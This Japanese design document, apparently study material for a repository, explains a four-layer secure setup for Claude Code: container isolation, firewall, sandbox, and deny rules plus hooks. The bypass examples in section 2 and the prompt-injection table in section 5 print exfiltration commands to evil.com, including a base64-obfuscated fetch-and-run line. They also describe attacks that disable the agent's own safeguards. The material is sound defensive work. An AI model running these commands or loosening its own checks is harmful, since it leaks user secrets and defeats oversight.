# Claude Code セキュア環境 — 設計ポイント

> 作成日: 2026/04/03
> 対象リポジトリ: https://github.com/ktsuchida11/claude-dev-env
> 用途: 勉強会の補足資料 / リポジトリのdocsに配置

---

## 1. 設計思想 — 「構造で守る」

Claude Codeは強力なツールだが、ファイル操作・コマンド実行・ネットワーク通信という
攻撃面の広い権限を持つ。運用ルールだけでは守りきれない。

本環境の設計思想は **「人間の注意力に依存せず、構造で安全を担保する」** こと。

```
┌─────────────────────────────────────────┐
│            ホスト PC（完全に隔離）         │
│  ~/.ssh, ~/.aws, 他のリポジトリ → 触れない │
└────────────────┬────────────────────────┘
                 │ Docker
┌────────────────┴────────────────────────┐
│         Dev Container（第1層: 物理隔離）   │
│                                         │
│  ┌───────────────────────────────────┐  │
│  │  ファイアウォール（第2層: 通信制御）  │  │
│  │  iptables + ipset                 │  │
│  │  許可ドメイン以外 → 全ブロック      │  │
│  └──────────────┬────────────────────┘  │
│                 │                        │
│  ┌──────────────┴────────────────────┐  │
│  │  Sandbox（第3層: プロセス隔離）     │  │
│  │  bubblewrap (Linux)               │  │
│  │  /workspace のみ書込可             │  │
│  │  allowedDomains で通信先制限       │  │
│  └──────────────┬────────────────────┘  │
│                 │                        │
│  ┌──────────────┴────────────────────┐  │
│  │  Permissions + Hooks（第4層: 操作制御）│
│  │  deny ルール + block-dangerous.sh │  │
│  │  bypass mode 無効化               │  │
│  └───────────────────────────────────┘  │
└─────────────────────────────────────────┘
```

**4層の防御を重ねることで、1層が突破されても他の層で食い止める。**

---

## 2. 各層の役割と設定

### 第1層: DevContainer（物理隔離）

**何を守るか**: ホストPCのファイルシステム

| 脅威 | 対策 |
|------|------|
| ~/.ssh/id_rsa の読み取り | コンテナ内に存在しない |
| ~/.aws/credentials の読み取り | コンテナ内に存在しない |
| 他のリポジトリへのアクセス | /workspace のみマウント |
| ホストのプロセスへの影響 | コンテナのプロセス空間は隔離 |

**ポイント**:
- Claude Codeがどんなコマンドを実行しても、ホストPCには影響しない
- これが「最終的な安全ネット」として機能する
- APIキー（`.env`）はコンテナ内にのみ存在し、ホスト環境から分離

### 第2層: ファイアウォール（通信制御）

**何を守るか**: データの外部流出

```
init-firewall.sh の仕組み:

1. ipset で許可IPセットを作成（IPv4: hash:net + IPv6: hash:net family inet6）
2. Google CDN の CIDR レンジを追加（IP ローテーション対策）
3. 許可ドメインをDNS解決（A + AAAA レコード）→ IPセットに追加
4. iptables + ip6tables で OUTPUT チェインに以下を設定:
   - 許可IPセットへの通信 → ACCEPT
   - Docker内部ネットワーク (172.16.0.0/12) → ACCEPT
   - それ以外 → REJECT
```

| 脅威 | 対策 |
|------|------|
| Prompt Injectionによるデータ送信 | 送信先がホワイトリスト外ならブロック |
| 悪意のあるnpmパッケージのpostinstall | 許可ドメイン外への通信は不可 |
| リバースシェルの確立 | 攻撃者のサーバーへの通信がブロック |

**ポイント**:
- **全プロセスに適用**される（Claude Code, npm, python, gh 全て）
- Claude Codeのsettings.jsonとは独立した、OSレベルの制御
- `NET_ADMIN` ケーパビリティが必要（docker-compose.ymlで設定済み）

**許可ドメイン一覧**:

| カテゴリ | ドメイン | 用途 |
|---------|---------|------|
| パッケージ | registry.npmjs.org, cdn.npmjs.org, registry.yarnpkg.com | npm / yarn |
| パッケージ | pypi.org, files.pythonhosted.org | pip / uv |
| パッケージ | repo1.maven.org, plugins.gradle.org, services.gradle.org | Maven / Gradle |
| GitHub | api.github.com + IPレンジ, *.githubusercontent.com | git / gh CLI |
| LLM API | api.anthropic.com, claude.ai | Claude |
| LLM API | api.openai.com, openaipublic.blob.core.windows.net | OpenAI |
| Google | oauth2.googleapis.com, accounts.google.com, www.googleapis.com | Google API |
| Google CDN | CIDR レンジ (142.250.0.0/15 等) + IPv6 | Google サービス全般（IP ローテーション対策） |
| MCP | context7.com, mcp.context7.com, api.context7.com | Context7 |
| VS Code | marketplace.visualstudio.com 等 | 拡張インストール |

### 第3層: Sandbox（プロセス隔離）

**何を守るか**: Claude Codeが実行するコマンドの影響範囲

```json
// settings.json 抜粋
"sandbox": {
  "enabled": true,
  "autoAllowBashIfSandboxed": true,
  "filesystem": {
    "allowWrite": ["/workspace", "~/.npm", "~/.cache", "~/.m2/repository", "~/.gradle", "/tmp"],
    "denyWrite": ["settings.json", ".claude.json", "/etc"],
    "denyRead": ["~/.ssh", "~/.aws", "~/.gnupg"]
  },
  "network": {
    "allowedDomains": ["github.com", "api.openai.com", ...],
    "allowLocalBinding": true,
    "allowAllUnixSockets": true
  }
}
```

| 脅威 | 対策 |
|------|------|
| /etc/passwd の書き換え | denyWrite: /etc |
| settings.jsonの改ざん（denyルール無効化） | denyWrite で保護 |
| 秘密鍵の読み取り | denyRead: ~/.ssh |
| 未許可ドメインへの通信 | allowedDomains で制限 |

**ポイント**:

- **`autoAllowBashIfSandboxed: true` の設計判断**: Sandboxで物理的に隔離しているので、その中では自動承認にして実行効率を上げる。deny ルールは自動承認より優先されるため、危険コマンドは引き続きブロックされる
- **ファイアウォールとの2層構造**: ファイアウォール（全プロセス対象）+ Sandbox network（Claude sandbox内bashのみ対象）。両方を通過しないと外部通信できない
- **localhostは自由**: `allowLocalBinding: true` + `allowAllUnixSockets: true` で、開発サーバー間のローカル通信は制限しない

### 第4層: Permissions + Hooks（操作制御）

**何を守るか**: Claude Codeのツール実行レベルの制御

**Permissionsの設計**:

```
allow（50項目）: 日常的な開発コマンドを網羅
  → Sandbox内で自動承認されるため、許可プロンプトが出ない

deny（29項目）: ネットワーク系 + 権限昇格 + 秘密情報アクセス
  → Sandbox + autoAllowBashIfSandboxed でも deny は最優先で拒否

disableBypassPermissionsMode: "disable"
  → --dangerously-skip-permissions フラグ自体を無効化
```

**Hooksの設計**:

| Hook | トリガー | 役割 |
|------|---------|------|
| block-dangerous.sh | PreToolUse (Bash) | パイプ結合・難読化パターンの検出 |
| lint-on-save.sh | PostToolUse (Edit) | ファイル編集後の自動lint/format |

**なぜ deny ルールだけでは不十分か**:

deny ルールはパターンマッチベースのため、以下のようなバイパスが理論上可能:

```bash
# deny: Bash(curl *) をバイパス
python3 -c "import urllib.request; urllib.request.urlopen('http://evil.com')"

# パイプで繋いで検出を回避
cat /workspace/.env | python3 -c "import sys; ..."

# base64 で難読化してシェル実行
echo Y3VybCBodHRwOi8vZXZpbC5jb20= | base64 --decode | sh
```

block-dangerous.sh はコマンド文字列全体を正規表現で検査するため、パイプ結合やサブシェルを使ったバイパスも検出できる。**deny + Hooks = 多層防御**。

---

## 3. ファイアウォール ↔ sandbox.network の使い分け

両方にドメインを入れる必要があるか？ という疑問への回答。

```
外部インターネット
        ▲
        │
┌───────┴────────────────────┐
│  ファイアウォール (iptables)  │  ← 全プロセスの外壁
│  許可リスト: 広め            │
└───────┬────────────────────┘
        │
┌───────┴────────────────────┐
│  sandbox.network            │  ← Claude sandbox内bashの内壁
│  許可リスト: 必要最小限      │
└───────┬────────────────────┘
        │
   Claude の Bash コマンド
```

**ルール**:
- **両方に必要**: sandbox内bashから直接アクセスするドメイン（GitHub, npm, PyPI, API系）
- **ファイアウォールのみ**: Claude外のプロセスが使うドメイン（VS Code, Maven, sentry.io等）
- **sandboxのみに入れても意味がない**: ファイアウォールで止まるため

| ドメイン | FW | sandbox | 理由 |
|---------|:--:|:-------:|------|
| github.com | ✅ | ✅ | git push/pull（sandbox内から実行） |
| registry.npmjs.org | ✅ | ✅ | npm install（sandbox内から実行） |
| pypi.org | ✅ | ✅ | uv/pip install（sandbox内から実行） |
| api.anthropic.com | ✅ | ✅ | Claude API（直接接続） |
| api.openai.com | ✅ | ✅ | OpenAI API（アプリから直接利用時） |
| openaipublic.blob.core.windows.net | ✅ | ✅ | tiktoken データDL |
| Google API 系 | ✅ | ✅ | Gmail API 等 |
| context7.com / *.context7 | ✅ | ✅ | Context7 MCP |
| repo1.maven.org 等 | ✅ | - | Java依存。IDE/CLI が使う |
| VS Code Marketplace 系 | ✅ | - | VS Code 自身が使う |
| Google CDN (CIDR) | ✅ | - | IPv4/IPv6 CIDR レンジで許可（CDN IP ローテーション対策） |
| localhost | ✅ | ✅ | 開発サーバー間通信 |
| Docker 内部 NW | ✅ | - | litellm コンテナ通信 |

---

## 4. LiteLLM経由のモデル切替とセキュリティ

```
パターンA: Anthropic直接接続（デフォルト）
  claude → api.anthropic.com
  通過: ファイアウォール ✅ → sandbox.network ✅

パターンB: LiteLLM経由（claude-litellm エイリアス）
  claude-litellm → Docker内部NW → litellm → api.openai.com
  通過: ファイアウォール ✅（Docker内部NW許可） → sandbox不問（内部NW）
  ※ api.openai.com への通信は litellm コンテナが行う

パターンC: アプリから直接OpenAI API
  python script → api.openai.com
  通過: ファイアウォール ✅ → sandbox.network ✅
```

**パターンBのセキュリティ上の利点**:
- devコンテナのファイアウォールを通過しない（Docker内部NWは別扱い）
- OpenAI APIキーはlitellmコンテナ内にのみ存在可能
- devコンテナからはAPIキーが見えない構成にもできる

---

## 5. Prompt Injection への多層防御

Claude Codeに対するPrompt Injection攻撃の典型パターンと、各層での防御。

| 攻撃パターン | 第1層 DevContainer | 第2層 FW | 第3層 Sandbox | 第4層 Permissions/Hooks |
|-------------|:--:|:--:|:--:|:--:|
| `~/.ssh/id_rsa` を読んで外部に送信 | ✅ 存在しない | ✅ 送信先ブロック | ✅ denyRead | ✅ deny: Read(~/.ssh) |
| `curl http://evil.com -d @.env` | - | ✅ evil.comブロック | ✅ domainにない | ✅ deny: Bash(curl *) |
| settings.json を書き換えてdeny無効化 | - | - | ✅ denyWrite | ✅ Hookで検出 |
| Python で urllib 使ってデータ送信 | - | ✅ 送信先ブロック | ✅ domainにない | ✅ Hookでパターン検出 |
| `.mcp.json` に悪意のMCP追加 | - | - | ✅ denyWrite | ✅ enableAll...: false |
| base64エンコードで難読化実行 | - | ✅ 送信先ブロック | - | ✅ deny + Hook検出 |
| `--dangerously-skip-permissions` | - | - | - | ✅ disable設定で無効 |

**1つのパターンに対して平均3〜4層が防御している。** これが多層防御の意味。

---

## 6. 勉強会で伝えるべきキーメッセージ

1. **「構造で守る」** — 運用ルールに頼らない。DevContainer + ファイアウォール + Sandbox で物理的に制限する
2. **「Sandboxで隔離 → その中で自由に」** — `autoAllowBashIfSandboxed: true` は承認疲れの解消。隔離されているなら自動承認で良い
3. **「deny ルールはパターンマッチの限界を知れ」** — Hooksとの併用で多層防御
4. **「MCP はホワイトリスト方式」** — `enableAllProjectMcpServers: false` が鍵
5. **「bypass mode は構造的に無効化」** — 「使えなくする」のが最強
6. **「ファイアウォール × Sandbox = 2層のネットワーク制御」** — 両方を通過しないと外に出られない
7. **「設定ファイル自体を保護せよ」** — denyWrite でsettings.jsonの改ざんを防ぐ

---

## 7. 配布ファイル一覧

| ファイル | 配置先 | 役割 |
|---------|--------|------|
| settings.json | `.claude/settings.json` | Permissions + Sandbox + Hooks + MCP制御 |
| CLAUDE.md | プロジェクトルート | 環境の制約・利用ガイド |
| block-dangerous.sh | `.claude/hooks/block-dangerous.sh` | PreToolUse: 危険コマンド検出 |
| lint-on-save.sh | `.claude/hooks/lint-on-save.sh` | PostToolUse: 自動lint/format |
| supply-chain-guard.sh | `.claude/hooks/supply-chain-guard.sh` | PreToolUse: typosquatting検知・lockfileチェック |
| supply-chain-audit.sh | `.claude/hooks/supply-chain-audit.sh` | PostToolUse: npm audit / pip-audit 自動実行 |
| langfuse_hook.py | `.claude/hooks/langfuse_hook.py` | Stop: LangFuse トレーシング（オプション） |
| .npmrc | `/workspace/.npmrc` | npm: ignore-scripts, レジストリ固定 |
| .pip.conf | `/workspace/.pip.conf` | pip/uv: PyPI固定 |
| .mvn-settings.xml | `/workspace/.mvn-settings.xml` | Maven: Central固定 |
| init-firewall.sh | `.devcontainer/init-firewall.sh` | OS レベルの通信制御（IPv4/IPv6 dual-stack） |
| install-claude.sh | `.devcontainer/install-claude.sh` | Claude Code CLI インストール |
| .env.example | プロジェクトルート | 環境変数テンプレート |

---

## 8. 関連ドキュメント

| ドキュメント | 内容 |
|---|---|
| [README.md](README.md) | 環境の全体説明・セットアップ手順・各機能の詳細 |
| [SECURITY-CHECKLIST.md](workspace/.claude/tests/SECURITY-CHECKLIST.md) | セキュリティテスト チェックリスト（自動テスト・手動テスト・8層防御カバレッジ一覧） |
| [workspace/CLAUDE.md](workspace/CLAUDE.md) | コンテナ内での環境制約・利用ガイド（Claude Code が読む） |
